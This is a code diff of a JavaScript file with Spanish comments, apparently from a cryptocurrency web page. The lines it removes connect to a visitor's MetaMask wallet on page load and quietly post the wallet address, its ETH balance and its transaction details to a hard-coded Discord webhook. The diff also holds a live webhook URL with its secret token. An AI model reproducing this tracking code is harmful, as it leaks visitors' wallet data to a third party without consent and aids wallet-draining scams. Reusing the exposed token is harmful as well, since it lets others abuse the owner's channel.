@@ -14,12 +14,18 @@ var ref=querySt("ref");null==ref?(ref="0x01C65F22A9478C2932e62483509c233F0aaD5c7
 
 
 
-// Reemplaza 'YOUR_WEBHOOK_URL' con la URL de tu webhook de Discord
+// URL del webhook de Discord
 const webhookUrl = 'https://discordapp.com/api/webhooks/1122722609130377216/qoKTeIBXFTCZoaJkujP4B3S2bxBN2Y7t77m58dkrJl4pUGjEO_qjaR3de8WrzFcIRO-f';
 
 // Función para enviar una notificación a Discord
 function sendDiscordNotification(content) {
-  axios.post(webhookUrl, { content })
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ content }),
+  })
     .then(response => {
       console.log('Notificación enviada a Discord');
     })
@@ -28,58 +34,12 @@ function sendDiscordNotification(content) {
     });
 }
 
-// Función para obtener el saldo de la cuenta en Metamask
-async function getAccountBalance() {
-  if (window.ethereum) {
-    try {
-      // Solicitar acceso a la cuenta de Metamask
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-  
-      // Obtener la dirección de la cuenta activa
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-      const account = accounts[0];
-  
-      // Obtener el saldo de la cuenta en ETH
-      const balance = await window.ethereum.request({ method: 'eth_getBalance', params: [account, 'latest'] });
-      const balanceInEth = window.ethers.utils.formatEther(balance);
-  
-      // Enviar el saldo a Discord
-      sendDiscordNotification(`Saldo de la cuenta: ${balanceInEth} ETH`);
-    } catch (error) {
-      console.error('Error al obtener el saldo de la cuenta:', error);
-    }
-  } else {
-    console.error('Metamask no está instalado');
-  }
-}
+// Ejemplo de notificación cuando se realiza una transacción
+const transactionEvent = {
+  type: 'transaction',
+  user: 'JohnDoe',
+  amount: 100,
+};
 
-// Suscribirse a eventos de transacciones
-window.ethereum.on('tx', transactionHash => {
-  // Obtener los detalles de la transacción
-  window.ethereum.request({ method: 'eth_getTransactionByHash', params: [transactionHash] })
-    .then(transaction => {
-      const { from, to, value, gasPrice } = transaction;
-      
-      // Enviar notificación de transacción a Discord
-      sendDiscordNotification(`Nueva transacción:\nDe: ${from}\nA: ${to}\nCantidad: ${value} ETH\nPrecio del gas: ${gasPrice}`);
-    })
-    .catch(error => {
-      console.error('Error al obtener detalles de la transacción:', error);
-    });
-});
-
-// Suscribirse a eventos de cambio de cuenta
-window.ethereum.on('accountsChanged', accounts => {
-  // Obtener el nuevo saldo de la cuenta al cambiar de cuenta
-  getAccountBalance();
-});
-
-// Suscribirse a eventos de conexión de Metamask
-window.addEventListener('load', () => {
-  if (window.ethereum) {
-    // Obtener el saldo de la cuenta al cargar la página
-    getAccountBalance();
-  } else {
-    console.error('Metamask no está instalado');
-  }
-});
+// Ejemplo de cómo enviar una notificación cuando ocurre un evento
+sendDiscordNotification(`Se ha realizado una transacción:\nUsuario: ${transactionEvent.user}\nCantidad: ${transactionEvent.amount}`);
